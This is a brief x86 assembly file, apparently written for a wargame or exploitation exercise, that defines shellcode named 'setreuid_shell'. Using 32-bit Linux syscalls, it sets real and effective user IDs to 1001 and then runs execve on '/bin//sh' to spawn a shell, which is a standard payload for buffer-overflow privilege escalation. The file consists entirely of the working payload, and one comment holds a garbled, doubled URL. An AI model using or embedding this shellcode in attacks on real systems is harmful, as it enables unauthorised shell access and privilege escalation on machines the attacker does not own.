.intel_syntax noprefix

#https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linu://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux 

.global setreuid_shell

setreuid_shell:
xor 	eax, eax
mov 	al, 70			# setreuid syscall on 32 bit Linux (/usr/include/asm/unistd_32.h)
xor 	ebx, ebx
mov 	bx, 1001		# real uid
xor 	cx, cx
mov 	cx, 1001		# effective uid
int  	0x80
xor 	eax, eax		# clear eax
push 	eax
push 	0x68732f2f		# //sh
push    0x6e69622f		# /bin
mov 	ebx, esp		# place the pointer (esp) to the "/bin//sh" to ebx
mov     ecx, eax		# place 0 to argv pointer
mov 	edx, eax		# place 0 to env pointer
mov 	al, 0xb			# execve syscall number (11 on 32bit Linux)
int 	0x80
#xor 	eax, eax 		# clear eax (make it zero)
#inc 	eax 			# place 1 into eax (exit syscall number)
#int 	0x80
